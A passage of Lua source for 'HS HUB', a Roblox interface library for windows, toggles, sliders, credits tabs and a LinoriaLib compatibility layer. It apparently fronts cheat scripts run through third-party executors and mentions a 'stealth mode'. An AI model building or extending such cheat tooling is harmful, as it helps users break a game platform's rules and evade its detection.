        Position = UDim2.new(0, 12, 0, 38),
        BackgroundColor3 = Theme.Divider,
        BorderSizePixel = 0,
    })

    -- Content scroll
    local ContentScroll = _new("ScrollingFrame", {
        Parent = Content,
        Size = UDim2.new(1, -8, 1, -48),
        Position = UDim2.new(0, 4, 0, 44),
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        ScrollBarThickness = 2,
        ScrollBarImageColor3 = Theme.AccentA,
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
        CanvasSize = UDim2.new(0, 0, 0, 0),
    })
    _list(ContentScroll, Enum.FillDirection.Vertical, 4)
    _pad(ContentScroll, 10, 10, 6, 14)

    -- ── Drag the title bar ──────────────────────────
    _makeDraggable(TitleBar, Frame)

    -- ── Float button (toggle window) ─────────────────
    local FloatBtn = _makeFloatButton()
    FloatBtn.MouseButton1Click:Connect(function()
        Window:Toggle()
    end)

    -- ── Close button behavior (hide, don't destroy) ──
    closeBtn.MouseButton1Click:Connect(function()
        Window:Hide()
    end)

    -- expose internals
    Window._frame = Frame
    Window._titleBar = TitleBar
    Window._sidebar = Sidebar
    Window._sideScroll = SideScroll
    Window._content = Content
    Window._contentScroll = ContentScroll
    Window._contentTitle = contentTitle
    Window._floatBtn = FloatBtn

    -- ─────────────────────────────────────────────────
    --              WINDOW METHODS
    -- ─────────────────────────────────────────────────
    function Window:Show()
        Frame.Visible = true
        Frame.Size = UDim2.new(0, Sz.WinW, 0, 0)
        _tween(Frame, TI_MED, {Size = UDim2.new(0, Sz.WinW, 0, Sz.WinH)})
        Window.IsVisible = true
    end
    function Window:Hide()
        _tween(Frame, TI_FAST, {Size = UDim2.new(0, Sz.WinW, 0, 0)})
        task.delay(0.15, function() Frame.Visible = false end)
        Window.IsVisible = false
    end
    function Window:Toggle()
        if Window.IsVisible then Window:Hide() else Window:Show() end
    end
    function Window:SetToggleKey(keyName)
        Window._toggleKey = keyName
    end

    -- Listen for toggle keybind
    Window._toggleKey = opts.ToggleKey or "RightShift"
    UserInputService.InputBegan:Connect(function(inp, gp)
        if gp then return end
        if inp.KeyCode == Enum.KeyCode[Window._toggleKey] then
            Window:Toggle()
        end
    end)

    -- ─────────────────────────────────────────────────
    --              TAB / SECTION BUILDER
    -- ─────────────────────────────────────────────────
    local function _switchTo(tabName)
        if Window.ActiveTab == tabName then return end
        Window.ActiveTab = tabName
        ContentScroll.CanvasPosition = Vector2.new(0, 0)
        for tn, td in pairs(Window.Tabs) do
            local on = (tn == tabName)
            _tween(td._sideBtn, TI_FAST, {
                BackgroundColor3 = on and Theme.TabActive or Theme.BgSidebar,
                BackgroundTransparency = on and 0 or 1,
            })
            td._iconLbl.TextColor3 = on and Theme.AccentA or Theme.TextSub
            td._nameLbl.TextColor3 = on and Theme.Text or Theme.TextSub
            td._nameLbl.Font = on and Enum.Font.GothamBold or Enum.Font.Gotham
            td._indicator.Visible = on
            td._container.Visible = on
        end
        contentTitle.Text = tabName
    end

    function Window:CreateTab(name, icon)
        local Tab = {}
        Tab.Name = name
        Tab.Sections = {}

        -- Sidebar button
        local sideBtn = _new("TextButton", {
            Parent = SideScroll,
            Size = UDim2.new(1, 0, 0, Sz.TabH),
            BackgroundColor3 = Theme.TabActive,
            BackgroundTransparency = 1,
            BorderSizePixel = 0,
            Text = "",
            AutoButtonColor = false,
            LayoutOrder = (#Window.Tabs * 10) + 1,
        })
        _corner(6, sideBtn)

        -- left indicator bar
        local indicator = _new("Frame", {
            Parent = sideBtn,
            Size = UDim2.new(0, 3, 0, Sz.TabH - 14),
            Position = UDim2.new(0, 0, 0.5, -(Sz.TabH - 14)/2),
            BackgroundColor3 = Theme.AccentA,
            BorderSizePixel = 0,
            Visible = false,
        })
        _corner(2, indicator)

        local iconLbl = _new("TextLabel", {
            Parent = sideBtn,
            Size = UDim2.new(0, 22, 1, 0),
            Position = UDim2.new(0, 8, 0, 0),
            BackgroundTransparency = 1,
            Text = icon or "•",
            TextColor3 = Theme.TextSub,
            TextSize = 12,
            Font = Enum.Font.GothamBlack,
            TextXAlignment = Enum.TextXAlignment.Center,
        })
        local nameLbl = _new("TextLabel", {
            Parent = sideBtn,
            Size = UDim2.new(1, -34, 1, 0),
            Position = UDim2.new(0, 32, 0, 0),
            BackgroundTransparency = 1,
            Text = name,
            TextColor3 = Theme.TextSub,
            TextSize = Sz.TabText,
            Font = Enum.Font.Gotham,
            TextXAlignment = Enum.TextXAlignment.Left,
        })

        sideBtn.MouseEnter:Connect(function()
            if Window.ActiveTab ~= name then
                _tween(sideBtn, TI_FAST, {BackgroundColor3 = Theme.TabHover, BackgroundTransparency = 0})
            end
        end)
        sideBtn.MouseLeave:Connect(function()
            if Window.ActiveTab ~= name then
                _tween(sideBtn, TI_FAST, {BackgroundTransparency = 1})
            end
        end)
        sideBtn.MouseButton1Click:Connect(function() _switchTo(name) end)

        -- Tab's content container (sub-frame inside content scroll)
        local container = _new("Frame", {
            Parent = ContentScroll,
            Size = UDim2.new(1, 0, 0, 0),
            BackgroundTransparency = 1,
            BorderSizePixel = 0,
            AutomaticSize = Enum.AutomaticSize.Y,
            Visible = false,
            LayoutOrder = #Window.Tabs + 1,
        })
        _list(container, Enum.FillDirection.Vertical, Sz.SectionPad)

        Tab._sideBtn = sideBtn
        Tab._indicator = indicator
        Tab._iconLbl = iconLbl
        Tab._nameLbl = nameLbl
        Tab._container = container

        -- ─────────────────────────────────────────────
        --        SECTION BUILDER
        -- ─────────────────────────────────────────────
        function Tab:CreateSection(title)
            local Sec = {}
            local secFrame = _new("Frame", {
                Parent = container,
                Size = UDim2.new(1, 0, 0, 0),
                BackgroundColor3 = Theme.BgCard,
                BorderSizePixel = 0,
                AutomaticSize = Enum.AutomaticSize.Y,
                ClipsDescendants = false,
                LayoutOrder = #Tab.Sections + 1,
            })
            _corner(8, secFrame)
            _stroke(secFrame, Theme.Border, 1, 0.6)

            local secList = _list(secFrame, Enum.FillDirection.Vertical, 2)
            _pad(secFrame, 4, 4, 6, 8)

            if title and title ~= "" then
                -- header bar with accent line
                local hdr = _new("Frame", {
                    Parent = secFrame,
                    Size = UDim2.new(1, -8, 0, 22),
                    BackgroundTransparency = 1,
                    LayoutOrder = 0,
                })
                _new("Frame", {
                    Parent = hdr,
                    Size = UDim2.new(0, 3, 0, 12),
                    Position = UDim2.new(0, 2, 0.5, -6),
                    BackgroundColor3 = Theme.AccentA,
                    BorderSizePixel = 0,
                })
                _new("TextLabel", {
                    Parent = hdr,
                    Size = UDim2.new(1, -12, 1, 0),
                    Position = UDim2.new(0, 10, 0, 0),
                    BackgroundTransparency = 1,
                    Text = title:upper(),
                    TextColor3 = Theme.AccentB,
                    TextSize = Sz.HdrText,
                    Font = Enum.Font.GothamBold,
                    TextXAlignment = Enum.TextXAlignment.Left,
                })
            end

            -- helper to add a row container
            local function newRow(h)
                local r = _new("Frame", {
                    Parent = secFrame,
                    Size = UDim2.new(1, -4, 0, h),
                    BackgroundTransparency = 1,
                    LayoutOrder = #secFrame:GetChildren(),
                })
                return r
            end

            -- ── TOGGLE ──
            function Sec:AddToggle(o)
                o = o or {}
                local row = newRow(30)
                local lbl = _new("TextLabel", {
                    Parent = row,
                    Size = UDim2.new(1, -60, 1, 0),
                    Position = UDim2.new(0, 8, 0, 0),
                    BackgroundTransparency = 1,
                    Text = o.Name or "Toggle",
                    TextColor3 = Theme.TextSub,
                    TextSize = Sz.ElemText,
                    Font = Enum.Font.Gotham,
                    TextXAlignment = Enum.TextXAlignment.Left,
                })
                local pill = _new("Frame", {
                    Parent = row,
                    Size = UDim2.new(0, Sz.PillW, 0, Sz.PillH),
                    Position = UDim2.new(1, -Sz.PillW - 6, 0.5, -Sz.PillH/2),
                    BackgroundColor3 = Theme.ToggleOff,
                    BorderSizePixel = 0,
                })
                _corner(Sz.PillH/2, pill)
                local knob = _new("Frame", {
                    Parent = pill,
                    Size = UDim2.new(0, Sz.KnobSz, 0, Sz.KnobSz),
                    Position = UDim2.new(0, 3, 0.5, -Sz.KnobSz/2),
                    BackgroundColor3 = Theme.Knob,
                    BorderSizePixel = 0,
                })
                _corner(Sz.KnobSz/2, knob)

                local state = o.Default or false
                local function refresh()
                    _tween(pill, TI_FAST, {BackgroundColor3 = state and Theme.ToggleOn or Theme.ToggleOff})
                    _tween(knob, TI_FAST, {
                        Position = state
                            and UDim2.new(1, -Sz.KnobSz - 3, 0.5, -Sz.KnobSz/2)
                            or UDim2.new(0, 3, 0.5, -Sz.KnobSz/2)
                    })
                    lbl.TextColor3 = state and Theme.Text or Theme.TextSub
                end
                refresh()

                local hit = _new("TextButton", {
                    Parent = row,
                    Size = UDim2.new(1, 0, 1, 0),
                    BackgroundTransparency = 1,
                    Text = "",
                })
                hit.MouseButton1Click:Connect(function()
                    state = not state
                    refresh()
                    if o.Callback then pcall(o.Callback, state) end
                end)

                local api = {}
                function api:Set(v) state = v and true or false; refresh(); if o.Callback then pcall(o.Callback, state) end end
                function api:Get() return state end
                return api
            end

            -- ── SLIDER ──
            function Sec:AddSlider(o)
                o = o or {}
                local mn, mx, step = o.Min or 0, o.Max or 100, o.Step or 1
                local value = o.Default or mn
                local row = newRow(46)

                local lbl = _new("TextLabel", {
                    Parent = row,
                    Size = UDim2.new(0.65, 0, 0, 20),
                    Position = UDim2.new(0, 8, 0, 4),
                    BackgroundTransparency = 1,
                    Text = o.Name or "Slider",
                    TextColor3 = Theme.TextSub,
                    TextSize = Sz.ElemText,
                    Font = Enum.Font.Gotham,
                    TextXAlignment = Enum.TextXAlignment.Left,
                })
                local val = _new("TextLabel", {
                    Parent = row,
                    Size = UDim2.new(0.3, 0, 0, 20),
                    Position = UDim2.new(0.68, 0, 0, 4),
                    BackgroundTransparency = 1,
                    Text = tostring(value),
                    TextColor3 = Theme.AccentB,
                    TextSize = Sz.ElemText,
                    Font = Enum.Font.GothamBold,
                    TextXAlignment = Enum.TextXAlignment.Right,
                })
                local track = _new("Frame", {
                    Parent = row,
                    Size = UDim2.new(1, -16, 0, Sz.SliderH),
                    Position = UDim2.new(0, 8, 0, 30),
                    BackgroundColor3 = Theme.BgInput,
                    BorderSizePixel = 0,
                })
                _corner(Sz.SliderH/2, track)
                local fill = _new("Frame", {
                    Parent = track,
                    Size = UDim2.new(0, 0, 1, 0),
                    BackgroundColor3 = Theme.AccentA,
                    BorderSizePixel = 0,
                })
                _corner(Sz.SliderH/2, fill)
                _gradient(fill, {Theme.AccentA, Theme.AccentB}, 0)

                local function setVal(v)
                    v = math.clamp(math.floor((v / step) + 0.5) * step, mn, mx)
                    value = v
                    val.Text = (step < 1) and string.format("%.2f", v) or tostring(math.floor(v))
                    fill.Size = UDim2.new(math.clamp((v - mn) / (mx - mn), 0, 1), 0, 1, 0)
                    if o.Callback then pcall(o.Callback, v) end
                end
                setVal(value)

                local sliding = false
                track.InputBegan:Connect(function(inp)
                    if inp.UserInputType == Enum.UserInputType.MouseButton1
                    or inp.UserInputType == Enum.UserInputType.Touch then
                        sliding = true
                        local rel = math.clamp((inp.Position.X - track.AbsolutePosition.X) / track.AbsoluteSize.X, 0, 1)
                        setVal(mn + (mx - mn) * rel)
                    end
                end)
                UserInputService.InputEnded:Connect(function(inp)
                    if inp.UserInputType == Enum.UserInputType.MouseButton1
                    or inp.UserInputType == Enum.UserInputType.Touch then sliding = false end
                end)
                UserInputService.InputChanged:Connect(function(inp)
                    if not sliding then return end
                    if inp.UserInputType == Enum.UserInputType.MouseMovement
                    or inp.UserInputType == Enum.UserInputType.Touch then
                        local rel = math.clamp((inp.Position.X - track.AbsolutePosition.X) / track.AbsoluteSize.X, 0, 1)
                        setVal(mn + (mx - mn) * rel)
                    end
                end)

                local api = {}
                function api:Set(v) setVal(v) end
                function api:Get() return value end
                return api
            end

            -- ── DROPDOWN ──
            function Sec:AddDropdown(o)
                o = o or {}
                local opts = o.Options or {}
                local idx = 1
                if o.Default then
                    for i, v in ipairs(opts) do if v == o.Default then idx = i; break end end
                end
                local row = newRow(32)
                _new("TextLabel", {
                    Parent = row,
                    Size = UDim2.new(0.5, 0, 1, 0),
                    Position = UDim2.new(0, 8, 0, 0),
                    BackgroundTransparency = 1,
                    Text = o.Name or "Dropdown",
                    TextColor3 = Theme.TextSub,
                    TextSize = Sz.ElemText,
                    Font = Enum.Font.Gotham,
                    TextXAlignment = Enum.TextXAlignment.Left,
                })
                local btn = _new("TextButton", {
                    Parent = row,
                    Size = UDim2.new(0.42, 0, 0, 24),
                    Position = UDim2.new(0.56, 0, 0.5, -12),
                    BackgroundColor3 = Theme.BgInput,
                    BorderSizePixel = 0,
                    Text = tostring(opts[idx] or ""),
                    TextColor3 = Theme.Text,
                    TextSize = Sz.BtnText,
                    Font = Enum.Font.Gotham,
                    AutoButtonColor = false,
                })
                _corner(5, btn)
                _stroke(btn, Theme.Border, 1, 0.5)
                btn.MouseButton1Click:Connect(function()
                    idx = (idx % #opts) + 1
                    btn.Text = tostring(opts[idx])
                    if o.Callback then pcall(o.Callback, opts[idx]) end
                end)
                local api = {}
                function api:Set(v)
                    for i, x in ipairs(opts) do
                        if x == v then idx = i; btn.Text = tostring(v); break end
                    end
                end
                function api:Get() return opts[idx] end
                function api:SetOptions(newOpts)
                    opts = newOpts; idx = 1
                    btn.Text = tostring(opts[idx] or "")
                end
                return api
            end

            -- ── BUTTON ──
            function Sec:AddButton(o)
                o = o or {}
                local row = newRow(34)
                local col = o.Color or Theme.BtnBase
                local hov = o.HoverColor or Theme.BtnBaseH
                if col == Theme.BtnDanger then hov = Theme.BtnDangerH end
                if col == Theme.BtnSafe   then hov = Theme.BtnSafeH end
                if col == Theme.BtnAction then hov = Theme.BtnActionH end

                local btn = _new("TextButton", {
                    Parent = row,
                    Size = UDim2.new(1, -12, 0, 26),
                    Position = UDim2.new(0, 6, 0.5, -13),
                    BackgroundColor3 = col,
                    BorderSizePixel = 0,
                    Text = o.Name or "Button",
                    TextColor3 = Theme.Text,
                    TextSize = Sz.BtnText,
                    Font = Enum.Font.GothamBold,
                    AutoButtonColor = false,
                })
                _corner(6, btn)
                _stroke(btn, Theme.Border, 1, 0.5)
                btn.MouseEnter:Connect(function() _tween(btn, TI_FAST, {BackgroundColor3 = hov}) end)
                btn.MouseLeave:Connect(function() _tween(btn, TI_FAST, {BackgroundColor3 = col}) end)
                btn.MouseButton1Click:Connect(function()
                    if o.Callback then pcall(o.Callback) end
                end)
                return {Set = function(_,n) btn.Text = n end}
            end

            -- ── LABEL / INFO ──
            function Sec:AddLabel(text, color)
                local row = newRow(20)
                local l = _new("TextLabel", {
                    Parent = row,
                    Size = UDim2.new(1, -16, 1, 0),
                    Position = UDim2.new(0, 8, 0, 0),
                    BackgroundTransparency = 1,
                    Text = text,
                    TextColor3 = color or Theme.TextSub,
                    TextSize = Sz.BtnText,
                    Font = Enum.Font.Gotham,
                    TextXAlignment = Enum.TextXAlignment.Left,
                })
                return {Set = function(_,n) l.Text = n end}
            end

            function Sec:AddInfo(left, right)
                local row = newRow(22)
                _new("TextLabel", {
                    Parent = row,
                    Size = UDim2.new(0.55, 0, 1, 0),
                    Position = UDim2.new(0, 8, 0, 0),
                    BackgroundTransparency = 1,
                    Text = left,
                    TextColor3 = Theme.TextSub,
                    TextSize = Sz.BtnText,
                    Font = Enum.Font.Gotham,
                    TextXAlignment = Enum.TextXAlignment.Left,
                })
                local r = _new("TextLabel", {
                    Parent = row,
                    Size = UDim2.new(0.4, 0, 1, 0),
                    Position = UDim2.new(0.58, 0, 0, 0),
                    BackgroundTransparency = 1,
                    Text = right,
                    TextColor3 = Theme.AccentA,
                    TextSize = Sz.BtnText,
                    Font = Enum.Font.GothamBold,
                    TextXAlignment = Enum.TextXAlignment.Right,
                })
                return {Set = function(_,n) r.Text = n end}
            end

            -- ── KEYBIND ──
            function Sec:AddKeybind(o)
                o = o or {}
                local current = o.Default or "RightShift"
                local row = newRow(32)
                _new("TextLabel", {
                    Parent = row,
                    Size = UDim2.new(0.55, 0, 1, 0),
                    Position = UDim2.new(0, 8, 0, 0),
                    BackgroundTransparency = 1,
                    Text = o.Name or "Keybind",
                    TextColor3 = Theme.TextSub,
                    TextSize = Sz.ElemText,
                    Font = Enum.Font.Gotham,
                    TextXAlignment = Enum.TextXAlignment.Left,
                })
                local btn = _new("TextButton", {
                    Parent = row,
                    Size = UDim2.new(0.38, 0, 0, 22),
                    Position = UDim2.new(0.6, 0, 0.5, -11),
                    BackgroundColor3 = Theme.BgInput,
                    BorderSizePixel = 0,
                    Text = "[" .. current .. "]",
                    TextColor3 = Theme.AccentB,
                    TextSize = Sz.BtnText,
                    Font = Enum.Font.Code,
                    AutoButtonColor = false,
                })
                _corner(5, btn)
                _stroke(btn, Theme.Border, 1, 0.5)
                local waiting = false
                btn.MouseButton1Click:Connect(function()
                    waiting = true
                    btn.Text = "[…]"
                    btn.TextColor3 = Theme.Orange
                end)
                UserInputService.InputBegan:Connect(function(inp, gp)
                    if not waiting or gp then return end
                    if inp.KeyCode ~= Enum.KeyCode.Unknown then
                        current = inp.KeyCode.Name
                        btn.Text = "[" .. current .. "]"
                        btn.TextColor3 = Theme.AccentB
                        waiting = false
                        if o.Callback then pcall(o.Callback, current) end
                    end
                end)
                local api = {}
                function api:Set(k) current = k; btn.Text = "[" .. k .. "]" end
                function api:Get() return current end
                return api
            end

            -- ── DIVIDER ──
            function Sec:AddDivider()
                local row = newRow(8)
                _new("Frame", {
                    Parent = row,
                    Size = UDim2.new(1, -16, 0, 1),
                    Position = UDim2.new(0, 8, 0.5, 0),
                    BackgroundColor3 = Theme.Divider,
                    BackgroundTransparency = 0.5,
                    BorderSizePixel = 0,
                })
            end

            table.insert(Tab.Sections, Sec)
            return Sec
        end

        Window.Tabs[name] = Tab
        if not Window.ActiveTab then _switchTo(name) end
        return Tab
    end

    -- ─────────────────────────────────────────────────
    --   AUTO CREDITS TAB  (call this last in user code)
    -- ─────────────────────────────────────────────────
    function Window:BuildCreditsTab(opts)
        opts = opts or {}
        local creator = opts.Creator or "isentp"
        local discord = opts.Discord or "https://discord.gg/5rpP6faZSJ"

        local Tab = Window:CreateTab("Credits", "♥")
        local s1 = Tab:CreateSection("CREATOR")
        s1:AddInfo("Hub Name", "HS HUB")
        s1:AddInfo("Full Name", "Hydra Solvation")
        s1:AddInfo("Version", Window.Tag)
        s1:AddInfo("Created by", creator)

        local s2 = Tab:CreateSection("DISCORD COMMUNITY")
        s2:AddLabel(discord, Theme.AccentB)
        s2:AddButton({
            Name = "Copy Discord Link",
            Color = Theme.BtnAction,
            Callback = function()
                local ok = pcall(_setclipboard, discord)
                if ok then
                    Notify("Discord link copied!", "ok", 2)
                else
                    Notify("Clipboard unavailable — copy manually above", "warn", 3)
                end
            end,
        })

        local s3 = Tab:CreateSection("LIBRARY")
        s3:AddInfo("UI Library", "HSHub_UI " .. HSHub.Version)
        s3:AddInfo("Platform", _platform)
        s3:AddInfo("Style", "king_legacy + LenyUI")

        local s4 = Tab:CreateSection("CHANGELOG")
        s4:AddLabel("v1.0.0 — initial release", Theme.TextSub)
        s4:AddLabel("• purple→cyan gradient theme", Theme.TextSub)
        s4:AddLabel("• signature panel persistent", Theme.TextSub)
        s4:AddLabel("• mobile + PC adaptive", Theme.TextSub)

        return Tab
    end

    table.insert(HSHub.Windows, Window)
    Window:Show()
    return Window
end

-- ═════════════════════════════════════════════════════════════════════
--                     PUBLIC HELPERS
-- ═════════════════════════════════════════════════════════════════════
function HSHub:Notify(...)
    Notify(...)
end

function HSHub:SetTheme(overrides)
    for k, v in pairs(overrides or {}) do
        if Theme[k] ~= nil then Theme[k] = v end
    end
end

function HSHub:GetPlatform() return _platform end

function HSHub:DestroyAll()
    pcall(function() ScreenGui:Destroy() end)
    shared.__HSHub_UI = nil
end

return HSHub
end)()

-- ─── inlined: HSHub_Signature ─────────────────────────────────
_G.HSHub_Signature = (function()
local Signature = {}

-- ═════════════════════════════════════════════════════════════════════
--                    CANONICAL IDENTITY (DO NOT FORK)
-- ═════════════════════════════════════════════════════════════════════
Signature.Brand        = "HS HUB"
Signature.FullName     = "Hydra Solvation"
Signature.Creator      = "isentp"
Signature.Discord      = "https://discord.gg/5rpP6faZSJ"
Signature.DiscordShort = "discord.gg/5rpP6faZSJ"
Signature.LibVersion   = "1.0.0"
Signature.LogoColors   = {
    Primary   = Color3.fromRGB(140,  90, 245),  -- purple
    Secondary = Color3.fromRGB( 60, 200, 230),  -- cyan
}

-- ═════════════════════════════════════════════════════════════════════
--               HEADER TEMPLATE (for every game script)
-- ═════════════════════════════════════════════════════════════════════
function Signature.HeaderComment(gameName, gameTag, buildDate)
    gameName  = gameName  or "Unknown Game"
    gameTag   = gameTag   or "HS-V1"
    buildDate = buildDate or os.date("%Y-%m-%d")

    return string.format([=[
--[[
═══════════════════════════════════════════════════════════════════════
                           HS HUB
                       Hydra Solvation
                         by isentp
                  discord.gg/5rpP6faZSJ

    Game     : %s
    Build    : %s
    Date     : %s
    Library  : HSHub_UI v%s
═══════════════════════════════════════════════════════════════════════
]]
]=], gameName, gameTag, buildDate, Signature.LibVersion)
end

-- ═════════════════════════════════════════════════════════════════════
--             METADATA ACCESSOR (for runtime queries)
-- ═════════════════════════════════════════════════════════════════════
function Signature.GetMetadata()
    return {
        Brand        = Signature.Brand,
        FullName     = Signature.FullName,
        Creator      = Signature.Creator,
        Discord      = Signature.Discord,
        DiscordShort = Signature.DiscordShort,
        LibVersion   = Signature.LibVersion,
    }
end

-- ═════════════════════════════════════════════════════════════════════
--              ATTACH CREDITS TAB TO HSHub WINDOW
-- ═════════════════════════════════════════════════════════════════════
-- Auto-builds a standardized Credits tab. Call after main game tabs so
-- it appears at the bottom of the sidebar.
function Signature.AttachToWindow(Window, opts)
    opts = opts or {}
    if not Window or not Window.CreateTab then
        return
    end

    local tab = Window:CreateTab("Credits", "♥")

    -- Single section, minimal — per project owner spec.
    local s = tab:CreateSection("CREDIT")
    s:AddLabel("credit to: " .. Signature.Creator, Color3.fromRGB(220, 220, 235))
    s:AddDivider()
    s:AddLabel(Signature.DiscordShort, Color3.fromRGB(60, 200, 230))
    s:AddButton({
        Name  = "📋  Copy Discord",
        Color = Color3.fromRGB(25, 35, 75),
        Callback = function()
            local sc = setclipboard or toclipboard
            if sc then
                local ok = pcall(sc, Signature.Discord)
                if ok and shared.__HSHub_UI then
                    shared.__HSHub_UI:Notify("Discord link copied", "ok", 2)
                end
            else
                if shared.__HSHub_UI then
                    shared.__HSHub_UI:Notify("Clipboard unavailable on this executor", "warn", 3)
                end
            end
        end,
    })

    return tab
end

-- ═════════════════════════════════════════════════════════════════════
--          STANDALONE PRINT (debug — opt-in, not auto-called)
-- ═════════════════════════════════════════════════════════════════════
-- NOTE: production scripts should NOT call this (no output to console
-- in stealth mode).  Only for development use.
function Signature.PrintHeader()
    -- intentionally a no-op in production builds
end

-- ═════════════════════════════════════════════════════════════════════
--          DETECT-AND-FLAG FOR CLAUDE AI (project knowledge marker)
-- ═════════════════════════════════════════════════════════════════════
-- Embedded marker so Claude AI sessions can recognize this file via
-- Project Knowledge retrieval. Don't remove.
Signature.__claudeai_marker = "HSHUB-SIGNATURE-V1-ISENTP-HYDRA-SOLVATION"

return Signature
end)()

-- ─── inlined: HSHub_LinoriaCompat ─────────────────────────────
_G.HSHub_LinoriaCompat = (function()
local LinoriaCompat = {}

-- Build a new library + theme_manager + save_manager set wired to HSHub.
-- Returns: library, theme_manager, save_manager, hsWindow
function LinoriaCompat.new(HSHub, opts)
    opts = opts or {}
    local hsWindow -- created by library:CreateWindow

    -- HideGroupboxes: case-insensitive set of groupbox titles to suppress
    -- (returns no-op stub so original code can :AddLabel/:AddToggle on it
    -- without affecting UI). Used to dedupe credits sections, etc.
    local hideSet = {}
    if opts.HideGroupboxes then
        for _, n in ipairs(opts.HideGroupboxes) do
            hideSet[tostring(n):lower()] = true
        end
    end

    -- Registries (LinoriaLib pattern)
    local Toggles = {}
    local Options = {}

    -- Make these globally reachable too (some scripts use getgenv().Linoria.Toggles)
    getgenv().Linoria = getgenv().Linoria or {}
    getgenv().Linoria.Toggles = Toggles
    getgenv().Linoria.Options = Options

    -- ─── library object ────────────────────────────────────────────
    local library = {}
    library.Toggles = Toggles
    library.Options = Options
    library.Folder = "_hsd_specter2"

    -- Stubs for LinoriaLib API surface that some scripts touch directly.
    -- These prevent nil-index errors when callbacks reference them.
    library.KeybindFrame   = { Visible = false }
    library.NotifySide     = "Right"
    library.ToggleKeybind  = nil  -- assigned later by user code if they want
    library.Toggled        = true
    library.MinSize        = Vector2.new(550, 600)

    library.Notify = function(self, text)
        HSHub:Notify(tostring(text), "info", 3)
    end
    -- LinoriaLib used to take notify as method or static — support both
    setmetatable(library, {
        __call = function(_, text) HSHub:Notify(tostring(text), "info", 3) end
    })

    function library:SetWatermark(text)      -- no-op (HSHub has its own brand panel)
        self._watermark = tostring(text or "")
    end
    function library:SetWatermarkVisibility(v) end
    function library:Unload() pcall(function() HSHub:DestroyAll() end) end

    -- ─── window builder ────────────────────────────────────────────
    function library:CreateWindow(winopts)
        winopts = winopts or {}
        hsWindow = HSHub:CreateWindow({
            Title    = opts.Brand    or "HS HUB",
            Subtitle = opts.Subtitle or winopts.Title or "?",
            Tag      = opts.Tag      or "HS-V1",
            ToggleKey = opts.ToggleKey or "RightShift",
        })
        library._hsWindow = hsWindow

        local windowWrap = {}
        windowWrap._hs = hsWindow

        function windowWrap:AddTab(name, icon)
            local tab = hsWindow:CreateTab(tostring(name), icon or "•")
            local tabWrap = {}
            tabWrap._hs = tab

            local function _wrapGroup(secTitle)
                local section = tab:CreateSection(tostring(secTitle))
                local gw = {}
                gw._hs = section

                -- ── Toggle ──
                -- LinoriaLib chain pattern: AddToggle(...):AddKeyPicker(...) / :AddColorPicker(...)
                -- So returned entry must support those chain methods, delegating to parent gw.
                function gw:AddToggle(key, optsT)
                    optsT = optsT or {}
                    local entry; entry = {
                        Value = optsT.Default or false,
                        _onChanged = nil,
                        OnChanged = function(self, fn)
                            self._onChanged = fn
                            pcall(fn, self.Value)
                        end,
                        SetValue = function(self, v)
                            v = v and true or false
                            if self._toggleApi then self._toggleApi:Set(v) end
                            self.Value = v
                            if self._onChanged then pcall(self._onChanged, v) end
                            if optsT.Callback then pcall(optsT.Callback, v) end
                        end,
                        -- chain: attach a key picker NEXT TO this toggle (just adds to same section)
                        AddKeyPicker = function(_, kpKey, kpOpts)
                            return gw:AddKeyPicker(kpKey, kpOpts)
                        end,
                        -- chain: attach a color picker
                        AddColorPicker = function(_, cpKey, cpOpts)
                            return gw:AddColorPicker(cpKey, cpOpts)
                        end,
                    }
                    local toggleApi = section:AddToggle({
                        Name = optsT.Text or tostring(key),
                        Default = optsT.Default or false,
                        Callback = function(v)
                            entry.Value = v
                            if entry._onChanged then pcall(entry._onChanged, v) end
                            if optsT.Callback then pcall(optsT.Callback, v) end
                        end,
                    })
                    entry._toggleApi = toggleApi
                    Toggles[key] = entry
                    return entry
                end

                -- ── Slider ──
                function gw:AddSlider(key, optsS)
                    optsS = optsS or {}
                    local step = 1
                    if optsS.Rounding and optsS.Rounding > 0 then
                        step = 10 ^ (-optsS.Rounding)
                    elseif optsS.Step then
                        step = optsS.Step
                    end
                    local entry; entry = {
                        Value = optsS.Default or optsS.Min or 0,
                        _onChanged = nil,
                        OnChanged = function(self, fn)
                            self._onChanged = fn
                            pcall(fn, self.Value)
                        end,
                        SetValue = function(self, v)
                            if self._sliderApi then self._sliderApi:Set(v) end
                            self.Value = v
                            if self._onChanged then pcall(self._onChanged, v) end
                        end,
                    }
                    local sliderApi = section:AddSlider({
                        Name = optsS.Text or tostring(key),
                        Min = optsS.Min or 0,
                        Max = optsS.Max or 100,
                        Default = optsS.Default or optsS.Min or 0,
                        Step = step,
                        Callback = function(v)
                            entry.Value = v
                            if entry._onChanged then pcall(entry._onChanged, v) end
                            if optsS.Callback then pcall(optsS.Callback, v) end
                        end,
                    })
                    entry._sliderApi = sliderApi
                    Options[key] = entry
                    return entry
                end

                -- ── Dropdown ──
                function gw:AddDropdown(key, optsD)
                    optsD = optsD or {}
                    local opts_list = optsD.Values or optsD.Options or {}
                    local entry; entry = {
                        Value = optsD.Default or opts_list[1],
                        _onChanged = nil,
                        OnChanged = function(self, fn)
                            self._onChanged = fn
                            pcall(fn, self.Value)
                        end,
                        SetValue = function(self, v)
                            if self._ddApi then self._ddApi:Set(v) end
                            self.Value = v
                            if self._onChanged then pcall(self._onChanged, v) end
                        end,
                        SetValues = function(self, newList)
                            if self._ddApi and self._ddApi.SetOptions then
                                self._ddApi:SetOptions(newList)
                            end
                        end,
                    }
                    local ddApi = section:AddDropdown({
                        Name = optsD.Text or tostring(key),
                        Options = opts_list,
                        Default = optsD.Default or opts_list[1],
                        Callback = function(v)
                            entry.Value = v
                            if entry._onChanged then pcall(entry._onChanged, v) end
                            if optsD.Callback then pcall(optsD.Callback, v) end
                        end,
                    })
                    entry._ddApi = ddApi
                    Options[key] = entry
                    return entry
                end

                -- ── Button ──
                -- LinoriaLib supports two signatures:
                --   AddButton({Text = "...", Func = fn})
                --   AddButton("Text", fn)
                function gw:AddButton(optsB, fnB)
                    local btnText, btnFn
                    if type(optsB) == "string" then
                        btnText = optsB
                        btnFn = fnB or function() end
                    else
                        optsB = optsB or {}
                        btnText = optsB.Text or "Button"
                        btnFn = optsB.Func or optsB.Callback or function() end
                    end
                    local btnApi = section:AddButton({
                        Name = btnText,
                        Callback = btnFn,
                    })
                    return {
                        SetText = function(_, t)
                            if btnApi and btnApi.Set then btnApi:Set(t) end
                        end,
                        AddButton = function(_, nextOpts, nextFn)
                            -- chain support: AddButton(...):AddButton(...)
                            return gw:AddButton(nextOpts, nextFn)
                        end,
                    }
                end

                -- ── Label ──
